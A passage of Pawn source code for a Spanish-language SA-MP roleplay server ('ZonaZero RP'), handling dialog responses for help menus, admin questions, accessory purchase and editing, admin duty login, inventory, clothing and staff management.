				Mensaje(playerid, -1, "{E48584}Sistema de Propiedades:{FFFFFF} /vendercasa /rcuarto /desalojar /desrentar /cinfo");
                Mensaje(playerid, -1, "{E48584}Sistema de Propiedades:{FFFFFF} /houseid /comprarcasa /houseint /cajafuerte /renta");
                Mensaje(playerid, -1, "{E48584}Sistema de Propiedades:{FFFFFF} /vendercas [Jugador a jugador] /pagarcasa [Ubicado dentro del Ayuntamiento NPC]");
				}
				case 2:
				{
				Mensaje(playerid, -1, "Comandos ZonaZero RP:");
                Mensaje(playerid, -1, "{E48584}Sistema de Vehículos:{FFFFFF} /papeles /ejectar /vmaletero");
                Mensaje(playerid, -1, "{E48584}Sistema de Vehículos:{FFFFFF} /llenar /pcu(gasolina) /cinturon /ven /vehiculo /venderauto");
                Mensaje(playerid, -1, "{E48584}Sistema de Vehículos:{FFFFFF} /venderveh [Jugador a jugador]");
                Mensaje(playerid, -1, "{E48584}Sistema de Vehículos:{FFFFFF} /marcha (lenta/normal/rapida) [Cambia la velocidad Maxima]");
                Mensaje(playerid, -1, "{E48584}Sistema de Vehículos:{FFFFFF} /pagarauto [Ubicado dentro del Ayuntamiento - NPC]");
				}
				case 3:{
				Mensaje(playerid, -1, "Comandos ZonaZero RP:");
				Mensaje(playerid, -1, "{E48584}Sistema de Negocios:{FFFFFF} /comprarnegocio /sganancias /extorcion /qextorcion /recaudar /vendernegocio");
				Mensaje(playerid, -1, "{E48584}Sistema de Negocios:{FFFFFF} /pagarnegocio /costoentrada /comprarproductos /negocio");
				Mensaje(playerid, -1, "{E48584}Sistema de Negocios:{FFFFFF} /venderneg [Jugador a jugador] /pagarnegocio [Ubicado dentro del Ayuntamiento NPC]");
				}
				case 4:{
					Mensaje(playerid, -1, "Comandos ZonaZero RP:");
					Mensaje(playerid, -1, "{E48584}Sistema de familias:");
					Mensaje(playerid, -1, "{E48584}Comandos Lider:{FFFFFF} /fnombre /frangos /fhechar /freclutar /frango /fcuartel /ftogfac");
					Mensaje(playerid, -1, "{E48584}Comandos Miembros:{FFFFFF} /fmiembros /fam (Canal OOC) /fr (Radio) /familias /fsalir");
				}
				case 5:
				{
					Mensaje(playerid, -1, "Comandos ZonaZero RP:");
					Mensaje(playerid, -1, "{E48584}Comandos para Líderes");
					Mensaje(playerid, -1, "{AFAFAF}[*] /contratar: {FFFFFF}Contrata miembros de forma IG");
					Mensaje(playerid, -1, "{AFAFAF}[*] /faccion: {FFFFFF}Edita a tus miembros de modo [OFFLINE], asciende, degrada y expulsa!");
					Mensaje(playerid, -1, "{AFAFAF}[*] /miembros: {FFFFFF}Ve la lista de miembros conectados IG");
					Mensaje(playerid, -1, "{AFAFAF}[*] /ascender: {FFFFFF}Asciende a un miembro de forma IG");
					Mensaje(playerid, -1, "{AFAFAF}[*] /despedir: {FFFFFF}Expulsa a un miembro de forma IG");
					Mensaje(playerid, -1, "{AFAFAF}[*] /editarfaccion: {FFFFFF}Edita el nombre de tu faccion y los rangos [SOLO ILEGALES]");
				}
				case 6:
				{
					if(!cuenta[playerid][cMiembro] && !cuenta[playerid][cLider])return Mensaje(playerid, COLOR_GRIS2, "No eres miembro de facción!");
					if(cuenta[playerid][cLider])
					{
						switch(cuenta[playerid][cLider])
						{
							case 1:
							{
							    Mensaje(playerid, -1, "{E48584}LSPD [RANGOS 3]:{FFFFFF}/embargar /quitarseguro /remolcar /changeit (Cambia Spawn de auto)");
								Mensaje(playerid, -1, "{E48584}LSPD:{FFFFFF} /duty /d /radio /r /m /multar /equipo /placa /ap /cp /ta /drag");
								Mensaje(playerid, -1, "{E48584}LSPD:{FFFFFF} /limpiar /ant /arrestar /su /bk /bkc /esposar /revisarcarga /quitar");
								Mensaje(playerid, -1, "{E48584}LSPD:{FFFFFF} /vercinturon /remolcar /allanarcasa /revisarcasa /incautar /bar /qb");
								Mensaje(playerid, -1, "{E48584}LSPD:{FFFFFF} /pstrips /qstrips /retener /camaras /sospechosos /qbs /miranda");
								Mensaje(playerid, -1, "{E48584}LSPD:{FFFFFF} /tlcdesasdb /quitarcarga /estadoemergencia (SOLO LG)");
								Mensaje(playerid, -1, "{E48584}LSPD:{FFFFFF} /quemarcosecha [SOLO PARA COSECHAS PG (Medio de la calle o lugares publicos]");
							}
						   	case 3:
							{
						   		Mensaje(playerid, -1, "{E48584}LSMC:{FFFFFF} /tlcdesasdb /duty /d /equipo /m /sacarsangre");
								Mensaje(playerid, -1, "{E48584}LSMC:{FFFFFF} /rescatar /pcinfo /operar /examinar /sangre /diagnostico /curar");
						   	}
						   	case 4:
							{
							   	Mensaje(playerid, -1, "{E48584}Mecanicos:{FFFFFF} /gpsmeca /removegps /duty /changeit /mm");
							}
						   case 6:
						   {
			   		 			Mensaje(playerid, -1, "{E48584}Gobierno:{FFFFFF} /duty /d /equipo /gob /impuesto /estadoemergencia (SOLO LG)");
							}
						   case 7:
						   {
						   		Mensaje(playerid, -1, "{E48584}CNN:{FFFFFF} /duty /noticias /entrevista /centrevista");
						   	}
						   case 9:
						   {
						    	Mensaje(playerid, -1, "{E48584}FBI:{FFFFFF} /incautar /equipo /bk /bkc /placa /ap /cp /controlcelda");
								Mensaje(playerid, -1, "{E48584}FBI:{FFFFFF} /cachear /quitar /sospechosos /su /ant /limpiar");
							}
						}
					}else if(cuenta[playerid][cMiembro])
					{
						switch(cuenta[playerid][cMiembro])
						{
							case 1:
							{
			    				Mensaje(playerid, -1, "{E48584}LSPD [RANGOS 3]:{FFFFFF}/embargar /quitarseguro /remolcar");
								Mensaje(playerid, -1, "{E48584}LSPD:{FFFFFF} /duty /d /radio /r /m /multar /equipo /placa /ap /cp /ta /drag");
								Mensaje(playerid, -1, "{E48584}LSPD:{FFFFFF} /limpiar /ant /arrestar /su /bk /bkc /esposar /revisarcarga /quitar");
								Mensaje(playerid, -1, "{E48584}LSPD:{FFFFFF} /vercinturon /remolcar /allanarcasa /revisarcasa /incautar /bar /qb");
								Mensaje(playerid, -1, "{E48584}LSPD:{FFFFFF} /pstrips /qstrips /retener /camaras /sospechosos /qbs /miranda");
								Mensaje(playerid, -1, "{E48584}LSPD:{FFFFFF} /tlcdesasdb /quitarcarga");
								Mensaje(playerid, -1, "{E48584}LSPD:{FFFFFF} /quemarcosecha [SOLO PARA COSECHAS PG (Medio de la calle o lugares publicos]");
							}
						   	case 3:
							{
						   		Mensaje(playerid, -1, "{E48584}LSMC:{FFFFFF} /tlcdesasdb /duty /d /equipo /m /sacarsangre");
								Mensaje(playerid, -1, "{E48584}LSMC:{FFFFFF} /rescatar /pcinfo /operar /examinar /sangre /diagnostico /curar");
						   	}
						   	case 4:
							{
							   	Mensaje(playerid, -1, "{E48584}Mecanicos:{FFFFFF} /gpsmeca /removegps /duty /changeit /mm");
							}
							case 6:
							{
			   		 			Mensaje(playerid, -1, "{E48584}Gobierno:{FFFFFF} /duty /d /equipo /gob /impuesto /fondoestado");
							}
							case 7:
							{
						   		Mensaje(playerid, -1, "{E48584}CNN:{FFFFFF} /duty /noticias /entrevista /centrevista");
							}
							case 9:
							{
						    	Mensaje(playerid, -1, "{E48584}FBI:{FFFFFF} /incautar /equipo /bk /bkc /placa /ap /cp /controlcelda /placa");
								Mensaje(playerid, -1, "{E48584}FBI:{FFFFFF} /cachear /quitar /sospechosos /su /ant /limpiar");
							}
						}
                    }
				}
				case 7:
				{
					if(!cuenta[playerid][cTrabajo])return Mensaje(playerid, COLOR_GRIS2, "No tienes trabajo!");
					new trabajoid = cuenta[playerid][cTrabajo];
					format(string, sizeof(string), "{E48584}%s:{FFFFFF} | %s |", trabajos[trabajoid][trabNombre], trabajos[trabajoid][trabCmds]);
					Mensaje(playerid, COLOR_BLANCO, string);
				}
				case 8:
				{
				 Mensaje(playerid, -1, "Ayuda de Rol");
				 Mensaje(playerid, -1, "{E48584}AVISO!{FFFFFF} EL SUBSIDIO (PAYDAY) SE RECOGE EN EL BANCO (Revisar Mapa)!");
				 Mensaje(playerid, -1, "{E48584}Definiciones{FFFFFF} /dm /pg /mg /fk /ck");
			    }
				}
			}
		}
        case DIALOG_DUDA:
		{
	 		if(response)
   			{
   			    if(strlen(inputtext) < 2 )
		          {
		          Mensaje(playerid, COLOR_GRIS2, "Escribe más de dos letras!");
			      return 1;
         		}
                booleano[duda]{playerid} = true;
            	booleano[PlayerDuda]{playerid} = true;
     			format(string, sizeof(string), "{E98781}» DUDA:{FFFFFF} %s", inputtext);
     			MensajeAdmin(-1, string, 1);
     			format(string, sizeof(string), "{E98781}» Autor: {FFFFFF}%s (ID:%d). Utilice {E98781}/aduda{FFFFFF} para responder.", PlayerName(playerid), playerid);
     			MensajeAdmin(-1, string, 1);
				Mensaje(playerid, COLOR_AZUL_CLARO, "»{FFFFFF} Su duda/Pregunta ha sido procesada. Espere pascientemente que un administrador lo atenderá.");
 			}
		}
	    case BUYTOYS:
	    {
	        if(response)
	        {
 				new stringg[512];
				for(new x;x<MAX_PLAYERTOYS;x++)
				{
					new name[24];
    				format(name, sizeof(name), "Nada");

					for(new i;i<sizeof(juguetesObjetos);i++)
					{
						if(juguetesObjetos[i][hmodelid] == juguetes[playerid][x][ptModelID])
 						{
							format(name, sizeof(name), "%s", juguetesObjetos[i][hmodelname]);
						}
					}
					format(stringg, sizeof(stringg), "%s(%d) %s (Parte: %s)\n", stringg, x, name, HoldingBones[juguetes[playerid][x][ptBone]]);
				}
				ShowPlayerDialog(playerid, BUYTOYS2, DIALOG_STYLE_LIST, "Selecciona un Slot", stringg, "Seleccionar", "Cancelar");
			}
		}
		case BUYTOYS2:
		{
		    if (response)
		    {
		 		if(juguetes[playerid][listitem][ptModelID] != 0)return Mensaje(playerid, COLOR_AMARILLO2, "* Ya tienes algo en esa ranura, eliminala con /toys");

				slotselection[playerid] = listitem;

				new stringg[3821];
				for(new x;x<sizeof(juguetesObjetos);x++)
				{
 					format(stringg, sizeof(stringg), "%s%s ($%d)\n", stringg, juguetesObjetos[x][hmodelname], juguetesObjetos[x][hprice]);
				}
				ShowPlayerDialog(playerid, BUYTOYS3, DIALOG_STYLE_LIST, "Selecciona un Objeto", stringg, "Comprar", "Cancelar");
			}
		}
		case BUYTOYS3:
		{
		    if (response)
		    {
				if(obtenerDinero(playerid) < juguetesObjetos[listitem][hprice])
				{
  					Mensaje(playerid, COLOR_BLANCO, "* Usted no tiene suficiente dinero");
				}
				else
				{
					pierdeDinero(playerid, juguetesObjetos[listitem][hprice]);
					juguetes[playerid][slotselection[playerid]][ptModelID] = juguetesObjetos[listitem][hmodelid];

					new modelid = juguetes[playerid][slotselection[playerid]][ptModelID];
					switch(modelid)
					{
					    case 19006..19035, 19138..19140:
					    {
	       					juguetes[playerid][slotselection[playerid]][ptBone] = 2;
							juguetes[playerid][slotselection[playerid]][ptPosX] = 0.9;
							juguetes[playerid][slotselection[playerid]][ptPosY] = 0.0;
							juguetes[playerid][slotselection[playerid]][ptPosZ] = 0.35;
							juguetes[playerid][slotselection[playerid]][ptRotX] = 90.0;
							juguetes[playerid][slotselection[playerid]][ptRotY] = 90.0;
							juguetes[playerid][slotselection[playerid]][ptRotZ] = 0.0;
	    				}
	    				case 18891..18910:
	    				{
			    			juguetes[playerid][slotselection[playerid]][ptBone] = 2;
							juguetes[playerid][slotselection[playerid]][ptPosX] = 0.15;
							juguetes[playerid][slotselection[playerid]][ptPosY] = 0.0;
							juguetes[playerid][slotselection[playerid]][ptPosZ] = 0.0;
							juguetes[playerid][slotselection[playerid]][ptRotX] = 90.0;
							juguetes[playerid][slotselection[playerid]][ptRotY] = 180.0;
							juguetes[playerid][slotselection[playerid]][ptRotZ] = 90.0;
						}
						case 18926..18935:
						{
							juguetes[playerid][slotselection[playerid]][ptBone] = 2;
							juguetes[playerid][slotselection[playerid]][ptPosX] = 0.1;
							juguetes[playerid][slotselection[playerid]][ptPosY] = 0.0;
							juguetes[playerid][slotselection[playerid]][ptPosZ] = 0.0;
							juguetes[playerid][slotselection[playerid]][ptRotX] = 0.0;
							juguetes[playerid][slotselection[playerid]][ptRotY] = 0.0;
							juguetes[playerid][slotselection[playerid]][ptRotZ] = 0.0;
						}
						case 18911..18920:
						{
	    					juguetes[playerid][slotselection[playerid]][ptBone] = 2;
							juguetes[playerid][slotselection[playerid]][ptPosX] = 0.1;
							juguetes[playerid][slotselection[playerid]][ptPosY] = 0.035;
							juguetes[playerid][slotselection[playerid]][ptPosZ] = 0.0;
							juguetes[playerid][slotselection[playerid]][ptRotX] = 90.0;
							juguetes[playerid][slotselection[playerid]][ptRotY] = 180.0;
							juguetes[playerid][slotselection[playerid]][ptRotZ] = 90.0;
						}
						case 19078:
						{
	    					juguetes[playerid][slotselection[playerid]][ptBone] = 16;
							juguetes[playerid][slotselection[playerid]][ptPosX] = 0;
							juguetes[playerid][slotselection[playerid]][ptPosY] = 0;
							juguetes[playerid][slotselection[playerid]][ptPosZ] = 0;
							juguetes[playerid][slotselection[playerid]][ptRotX] = 180.0;
							juguetes[playerid][slotselection[playerid]][ptRotY] = 180.0;
							juguetes[playerid][slotselection[playerid]][ptRotZ] = 0.0;
						}
						case 18641..18644, 18890, 19080..19084:
						{
	    					juguetes[playerid][slotselection[playerid]][ptBone] = 6;
							juguetes[playerid][slotselection[playerid]][ptPosX] = 0.0;
							juguetes[playerid][slotselection[playerid]][ptPosY] = 0.0;
							juguetes[playerid][slotselection[playerid]][ptPosZ] = 0.0;
							juguetes[playerid][slotselection[playerid]][ptRotX] = 0.0;
							juguetes[playerid][slotselection[playerid]][ptRotY] = 0.0;
							juguetes[playerid][slotselection[playerid]][ptRotZ] = 0.0;
						}
						default:
						{
							juguetes[playerid][slotselection[playerid]][ptBone] = 2;
							juguetes[playerid][slotselection[playerid]][ptPosX] = 0.0;
							juguetes[playerid][slotselection[playerid]][ptPosY] = 0.0;
							juguetes[playerid][slotselection[playerid]][ptPosZ] = 0.0;
							juguetes[playerid][slotselection[playerid]][ptRotX] = 0.0;
							juguetes[playerid][slotselection[playerid]][ptRotY] = 0.0;
							juguetes[playerid][slotselection[playerid]][ptRotZ] = 0.0;
						}
					}
					juguetes[playerid][slotselection[playerid]][ptScaleX] = 1.0;
					juguetes[playerid][slotselection[playerid]][ptScaleY] = 1.0;
					juguetes[playerid][slotselection[playerid]][ptScaleZ] = 1.0;
					
					format(string, sizeof(string), "* Usted a comprado un %s por $%d (Slot: %d)", juguetesObjetos[listitem][hmodelname], juguetesObjetos[listitem][hprice], slotselection[playerid]);
    				Mensaje(playerid, COLOR_ROJO, string);
    				Mensaje(playerid, COLOR_BLANCO, " Usa /toys para editar tus objetos.");
				}
  			}
		}
		case ADMINDUTY_LOGIN:
		{
			if(!strlen(inputtext))return ShowPlayerDialog(playerid, ADMINDUTY_LOGIN, DIALOG_STYLE_PASSWORD, "{EE6C68}Panel Administrativo", "{FFFFFF}Contraseña Incorrecta", "Ingresar", "Cancelar");
			if(!strcmp(inputtext, cuenta[playerid][cAcceso2]))
			{
				booleano[AdminDuty]{playerid} = true;
				booleano[HidePM]{playerid} = false;
				booleano[AntiAbusos]{playerid} = true;
				AdminChat[playerid] = 0;
				SetHP(playerid, 2000);
				darArmadura(playerid, 2000);
				
				Update3DTextLabelText(estado[playerid], COLOR_VERDE, "ADMINISTRADOR - EN SERVICIO");
				Attach3DTextLabelToPlayer(estado[playerid], playerid, 0.0, 0.0, 0.7);
				
				ShowPlayerDialog(playerid, CREDITOS, DIALOG_STYLE_MSGBOX, "{006FFF}Sistema Anti AA", "\n{FFFFFF}Sistema anti AA Recuerde revisar el /reglasadmin\n{006FFF}Saludos - Encargados de Staff", "Aceptar", "");
				format(string, sizeof(string), "{FFFFFF}[ADM] {006FFF}%s está conectado. (/w %d)", PlayerName(playerid), playerid); BroadCast(0xFFFFA4FF, string);
			}
		}
		case DIALOGO_INVENTARIO:
		{
			if(response)
			{
				switch(listitem)
				{
					case 1 .. 6:
					{
						if(!inventario[playerid][invArmas][listitem - 1])return Mensaje(playerid, COLOR_GRIS, "No tienes arma en este slot.");
						
						darArma(playerid, inventario[playerid][invArmas][listitem - 1], inventario[playerid][invBalas][listitem - 1]);
						inventario[playerid][invArmas][listitem - 1] = 0;
						inventario[playerid][invBalas][listitem - 1] = 0;
						Mensaje(playerid, COLOR_BLANCO, "Usted saco un arma de su inventario.");
					}
					case 8:
					{
						if(!inventario[playerid][invBebida][0])return Mensaje(playerid, COLOR_GRIS, "No tienes bebidas dentro.");
						new bbida = inventario[playerid][invBebida][0];
						
						entero[playerid][sbebidas] = bbida;
						entero[playerid][borracho] = inventario[playerid][invBebida][1];
						
						inventario[playerid][invBebida][0] = 0;
						inventario[playerid][invBebida][1] = 0;
						SetPlayerAttachedObject(playerid, 5, Bebidas[bbida][b@obj], 6, Bebidas[bbida][b@Pos][0], Bebidas[bbida][b@Pos][1], Bebidas[bbida][b@Pos][2], Bebidas[bbida][b@Pos][3], Bebidas[bbida][b@Pos][4], Bebidas[bbida][b@Pos][5], Bebidas[bbida][b@Pos][6], Bebidas[bbida][b@Pos][7], Bebidas[bbida][b@Pos][8]);
					}
				}
			}
			return 1;
		}
		case TOYS:
		{
		    if (response)
		    {
				switch(listitem)
				{
				    case 0:
				    {
			  			new stringg[512];
						for(new x;x<MAX_PLAYERTOYS;x++)
						{
    						new name[24];
    						format(name, sizeof(name), "Nada");

							for(new i;i<sizeof(juguetesObjetos);i++)
							{
    							if(juguetesObjetos[i][hmodelid] == juguetes[playerid][x][ptModelID])
        						{
        							format(name, sizeof(name), "%s", juguetesObjetos[i][hmodelname]);
								}
							} format(stringg, sizeof(stringg), "%s(%d) %s (Parte: %s)\n", stringg, x, name, HoldingBones[juguetes[playerid][x][ptBone]]);
						} ShowPlayerDialog(playerid, WEARTOY, DIALOG_STYLE_LIST, "Seleccione un Objeto", stringg, "Seleccionar", "Cancelar");
   					}
   					case 1:
					{
   						new stringg[512];
						for(new x;x<MAX_PLAYERTOYS;x++)
						{
    						new name[24];
    						format(name, sizeof(name), "Nada");

							for(new i;i<sizeof(juguetesObjetos);i++)
							{
    							if(juguetesObjetos[i][hmodelid] == juguetes[playerid][x][ptModelID])
        						{
        							format(name, sizeof(name), "%s", juguetesObjetos[i][hmodelname]);
								}
							} format(stringg, sizeof(stringg), "%s(%d) %s (Parte: %s)\n", stringg, x, name, HoldingBones[juguetes[playerid][x][ptBone]]);
						} ShowPlayerDialog(playerid, EDITTOYS, DIALOG_STYLE_LIST, "Seleccione un Objeto", stringg, "Seleccionar", "Cancelar");
  					}
  					case 2:
  					{
			   			new stringg[512];
						for(new x;x<MAX_PLAYERTOYS;x++)
						{
							new name[24];
    						format(name, sizeof(name), "Nada");

							for(new i;i<sizeof(juguetesObjetos);i++)
							{
    							if(juguetesObjetos[i][hmodelid] == juguetes[playerid][x][ptModelID])
   								{
       								format(name, sizeof(name), "%s", juguetesObjetos[i][hmodelname]);
								}
							} format(stringg, sizeof(stringg), "%s(%d) %s (Parte: %s)\n", stringg, x, name, HoldingBones[juguetes[playerid][x][ptBone]]);
						} ShowPlayerDialog(playerid, DELETETOY, DIALOG_STYLE_LIST, "Seleccione un Objeto", stringg, "Borrar", "Cancelar");
					}
				}
			}
		}
		case EDITTOYS:
		{
		    if (response)
		    {
		 		if(!juguetes[playerid][listitem][ptModelID])
 				{
 					ShowPlayerDialog(playerid, DIALOGO_DEFAULT, DIALOG_STYLE_MSGBOX, "Menú: Edición", "Usted no tiene nada en ese slot!", "Aceptar", "");
				}
				else
				{
   					slotselection[playerid] = listitem;
	  				ShowEditMenu(playerid);
				}
			}
		}
		case EDITTOYS2:
		{
	 		if (response)
 			{
 			    switch(listitem)
				{
					case 0:
					{
	      				ShowPlayerDialog(playerid, EDITTOYSBONE, DIALOG_STYLE_LIST, "Selecciona una Parte", "Columna\nCabeza\nBrazo Izq Sup\nBrazo Der Sup\nMano Izq\nMano Derecha\nMuslo Izq\nMuslo Der\nPie Izq\nPie Der\nRight calf\nLeft calf\nAnteBrazo Izq\nAnteBrazo Der\nClavicula Izq\nClavicula Der\nCuello\nQuijada", "Aceptar", "Cancelar");
			    	}
			    	case 1:
			    	{
		      			ShowPlayerDialog(playerid, EDITTOYSPX, DIALOG_STYLE_INPUT, "Menú: Edición", "Escribe una X Offset de -100 a 100 (Ejm: 55, o 33.4)", "Enter", "Cancelar");
					}
					case 2:
		   			{
      					ShowPlayerDialog(playerid, EDITTOYSPY, DIALOG_STYLE_INPUT, "Menú: Edición", "Escribe una Y Offset de -100 a 100 (Ejm: 55, o 33.4)", "Enter", "Cancelar");
					}
					case 3:
		   			{
      					ShowPlayerDialog(playerid, EDITTOYSPZ, DIALOG_STYLE_INPUT, "Menú: Edición", "Escribe una Z Offset de -100 a 100 (Ejm: 55, o 33.4)", "Enter", "Cancelar");
					}
					case 4:
		   			{
      					ShowPlayerDialog(playerid, EDITTOYSRX, DIALOG_STYLE_INPUT, "Menú: Edición", "Escribe una X Rotación de 0 a 360 (Ejm: 90, o 270.4)", "Enter", "Cancelar");
					}
					case 5:
					{
		      			ShowPlayerDialog(playerid, EDITTOYSRY, DIALOG_STYLE_INPUT, "Menú: Edición", "Escribe una Y Rotación de 0 a 360 (Ejm: 90, o 270.4)", "Enter", "Cancelar");
					}
					case 6:
		   			{
      					ShowPlayerDialog(playerid, EDITTOYSRZ, DIALOG_STYLE_INPUT, "Menú: Edición", "Escribe una Z Rotación de 0 a 360 (Ejm: 90, o 270.4)", "Enter", "Cancelar");
                    }
					case 7:
					{
						new index = slotselection[playerid];
			    	    SetPlayerAttachedObject(playerid, index, juguetes[playerid][index][ptModelID], juguetes[playerid][index][ptBone], juguetes[playerid][index][ptPosX], juguetes[playerid][index][ptPosY], juguetes[playerid][index][ptPosZ], juguetes[playerid][index][ptRotX], juguetes[playerid][index][ptRotY], juguetes[playerid][index][ptRotZ], juguetes[playerid][index][ptScaleX], juguetes[playerid][index][ptScaleY], juguetes[playerid][index][ptScaleZ]);
						EditAttachedObject(playerid, index);
						return 1;
					}
				}
			}
			else
			{
  				new stringg[512];
				for(new x;x<MAX_PLAYERTOYS;x++)
				{
   					new name[24];
   					format(name, sizeof(name), "Nada");

					for(new i;i<sizeof(juguetesObjetos);i++)
					{
    					if(juguetesObjetos[i][hmodelid] == juguetes[playerid][x][ptModelID])
        				{
       						format(name, sizeof(name), "%s", juguetesObjetos[i][hmodelname]);
						}
					} format(stringg, sizeof(stringg), "%s(%d) %s (Parte: %s)\n", stringg, x, name, HoldingBones[juguetes[playerid][x][ptBone]]);
				} ShowPlayerDialog(playerid, EDITTOYS, DIALOG_STYLE_LIST, "Seleccionar un Accesorio", stringg, "Seleccionar", "Cancelar");
			}
		}
		case EDITTOYSPX:
		{
 			if(response)
 			{
 	    		new Float:offset = floatstr(inputtext);
 	    		if(offset < -100) offset = 0;
				else if(offset > 100) offset = 100;
    			offset = offset/100;
    			juguetes[playerid][slotselection[playerid]][ptPosX] = offset;
			}
			ShowEditMenu(playerid);
		}
		case EDITTOYSPY:
		{
	  		if (response)
 			{
     			new Float:offset = floatstr(inputtext);
				if(offset < -100) offset = 0;
				else if(offset > 100) offset = 100;
   				offset = offset/100;
   				juguetes[playerid][slotselection[playerid]][ptPosY] = offset;
			}
			ShowEditMenu(playerid);
		}
		case EDITTOYSPZ:
		{
	 		if (response)
 			{
     			new Float:offset = floatstr(inputtext);
     			if(offset < -100) offset = 0;
				else if(offset > 100) offset = 100;
				offset = offset/100;
 	 			juguetes[playerid][slotselection[playerid]][ptPosZ] = offset;
			}
			ShowEditMenu(playerid);
		}
		case EDITTOYSRX:
		{
 			if (response)
 			{
     			new Float:offset = floatstr(inputtext);
     			if(offset < -100) offset = 0;
				else if(offset > 360) offset = 360;
   				juguetes[playerid][slotselection[playerid]][ptRotX] = offset;
			}
			ShowEditMenu(playerid);
		}
		case EDITTOYSRY:
		{
	 		if(response)
 			{
     			new Float:offset = floatstr(inputtext);
     			if(offset < -100) offset = 0;
				else if(offset > 360) offset = 360;
   				juguetes[playerid][slotselection[playerid]][ptRotY] = offset;
			}
			ShowEditMenu(playerid);
		}
		case EDITTOYSRZ:
		{
 			if (response)
 			{
     			new Float:offset = floatstr(inputtext);
     			if(offset < -100) offset = 0;
				else if(offset > 360) offset = 360;
   				juguetes[playerid][slotselection[playerid]][ptRotZ] = offset;
			}
			ShowEditMenu(playerid);
		}
		case EDITTOYSBONE:
		{
	 		if(response)
 			{
     			juguetes[playerid][slotselection[playerid]][ptBone] = listitem+1;
			}
			ShowEditMenu(playerid);
		}
		case WEARTOY:
		{
		    if (response)
		    {
		 		if(!juguetes[playerid][listitem][ptModelID])
 				{
 	    			ShowPlayerDialog(playerid, DIALOGO_DEFAULT, DIALOG_STYLE_MSGBOX, "Menú: Poner/Quitar", "Usted no tiene ningún objeto en este slot!", "Aceptar", "");
				}
				else
				{
   					if(IsPlayerAttachedObjectSlotUsed(playerid, listitem))
					{
   						new name[24];
   						format(name, sizeof(name), "Nada");

						for(new i;i<sizeof(juguetesObjetos);i++)
  						{
							if(juguetesObjetos[i][hmodelid] == juguetes[playerid][listitem][ptModelID])
							{
								format(name, sizeof(name), "%s", juguetesObjetos[i][hmodelname]);
							}
						}
	    				format(string, sizeof(string), "Te quitaste tu %s (Parte: %s) (Slot: %d)", name, HoldingBones[juguetes[playerid][listitem][ptBone]], listitem);
						Mensaje(playerid, COLOR_ROJO, string);
	    				RemovePlayerAttachedObject(playerid, listitem);
					}
					else
					{
			    	    SetPlayerAttachedObject(playerid, listitem, juguetes[playerid][listitem][ptModelID], juguetes[playerid][listitem][ptBone], juguetes[playerid][listitem][ptPosX], juguetes[playerid][listitem][ptPosY], juguetes[playerid][listitem][ptPosZ], juguetes[playerid][listitem][ptRotX], juguetes[playerid][listitem][ptRotY], juguetes[playerid][listitem][ptRotZ], juguetes[playerid][listitem][ptScaleX], juguetes[playerid][listitem][ptScaleY], juguetes[playerid][listitem][ptScaleZ]);
						new name[24];
    					format(name, sizeof(name), "Nada");

						for(new i;i<sizeof(juguetesObjetos);i++)
  						{
							if(juguetesObjetos[i][hmodelid] == juguetes[playerid][listitem][ptModelID])
							{
								format(name, sizeof(name), "%s", juguetesObjetos[i][hmodelname]);
							}
						}
						format(string, sizeof(string), "Te pusiste un %s. (Parte: %s) (Slot: %d)", name, HoldingBones[juguetes[playerid][listitem][ptBone]], listitem);
						Mensaje(playerid, COLOR_AZUL_CLARO, string);
					}
				}
			}
		}
		case DELETETOY:
		{
		    if (response)
		    {
				juguetes[playerid][listitem][ptModelID] = 0;
				juguetes[playerid][listitem][ptBone] = 0;
				juguetes[playerid][listitem][ptPosX] = 0.0;
				juguetes[playerid][listitem][ptPosY] = 0.0;
				juguetes[playerid][listitem][ptPosZ] = 0.0;
				juguetes[playerid][listitem][ptPosX] = 0.0;
				juguetes[playerid][listitem][ptPosY] = 0.0;
				juguetes[playerid][listitem][ptPosZ] = 0.0;
				if(IsPlayerAttachedObjectSlotUsed(playerid, listitem))
				{
				    RemovePlayerAttachedObject(playerid, listitem);
				}
				format(string, sizeof(string), "Usted ha eliminado su accesorio del slot %d", listitem);
				Mensaje(playerid, COLOR_BLANCO, string);
			}
		}
		case CLOTHES_CHOOSE_DIALOG:
		{
			if(response)
 			{
  				switch(listitem)
    			{
   					case 0:
     				{
		           		ClothesID	[playerid] = 16005;
		           		Accesory	[playerid] = 1;
            			Mensaje(playerid, COLOR_AMARILLO3, "- Utiliza la tecla ESPACIO para ver las distintas gafas");
		           		Mensaje(playerid, COLOR_AMARILLO3, "- Utiliza /comprar para comprar las gafas");
		           		Mensaje(playerid, COLOR_AMARILLO3, "- Utiliza /salirvestidor para no comprar nada");
					}
					case 1:
					{
    					ClothesID	[playerid] = 18910;
    					Accesory	[playerid] = 2;
    					Mensaje(playerid, COLOR_AMARILLO3, "- Utiliza la tecla ESPACIO para ver las distintas bandanas");
		            	Mensaje(playerid, COLOR_AMARILLO3, "- Utiliza /comprar para comprar la bandana");
		            	Mensaje(playerid, COLOR_AMARILLO3, "- Utiliza /salirvestidor para no comprar nada");
		            	Mensaje(playerid, COLOR_AMARILLO3, "** Recuerda: las bandanas solo se permiten con skin de pandillero**");
					}
					case 2:
					{
		        	    ClothesID	[playerid] = 18925;
		        	    Accesory	[playerid] = 3;
		        	    Mensaje(playerid, COLOR_AMARILLO3, "- Utiliza la tecla ESPACIO para ver los distintos gorros");
	           		 	Mensaje(playerid, COLOR_AMARILLO3, "- Utiliza /comprar para comprar los gorros");
		            	Mensaje(playerid, COLOR_AMARILLO3, "- Utiliza /salirvestidor para no comprar nada");
					}
	        	}
	    	}
		}
		case DIALOGO_EDITAR_STAFF:
		{
			if(response)
			{
				entero[playerid][opid2] = listitem;				
				ShowPlayerDialog(playerid, DIALOGO_EDITAR_STAFF_A, DIALOG_STYLE_LIST, "Opciones para el STAFF", "Cambiar Nivel\nExpulsar", "Aceptar", "Cancelar");
				return 1;
			}
		}
		case DIALOGO_EDITAR_STAFF_A:
		{
			if(response)
			{
				new i = entero[playerid][opid2], consulta[128];
				switch(listitem)
				{
					case 0:
					{
						ShowPlayerDialog(playerid, DIALOGO_EDITAR_STAFF_B, DIALOG_STYLE_INPUT, "Ingresar Rango", "{ffffff}Ingrese el nivel administrativo que quiere para este jugador.\nSolo del 1 al 6 y 2012. (Dueños 2013 y 2014)", "Aceptar", "Cancelar");
					}
					case 1:
					{
						mysql_format(servidor[mysqlControl], consulta, sizeof(consulta), "UPDATE zz_usuarios SET niveladmin=0, inv20=0, tadmin=0 WHERE id=%d", entero[playerid][opid][i]);
						Mensaje(playerid, COLOR_VERDE, "Usted expulso a este STAFF exitosamente.");
					}
				}
				mysql_query(servidor[mysqlControl], consulta, false);
			}
			return 1;
		}
		case DIALOGO_EDITAR_STAFF_B:
		{
